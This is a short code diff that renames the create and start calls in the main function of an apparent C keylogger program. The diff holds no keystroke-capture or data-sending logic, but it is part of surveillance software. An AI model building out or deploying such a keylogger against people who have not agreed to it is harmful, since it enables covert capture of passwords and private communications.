@@ -4,13 +4,13 @@
 
 int main()
 {
-  KeyLogger *keyLogger = createKeyLogger();
+  KeyLogger *keyLogger = CreateKeyLogger();
 
   if (keyLogger == NULL)
   {
     return 1;
   }
 
-  startKeyLogger(keyLogger);
+  StartKeyLogger(keyLogger);
   return 0;
 }
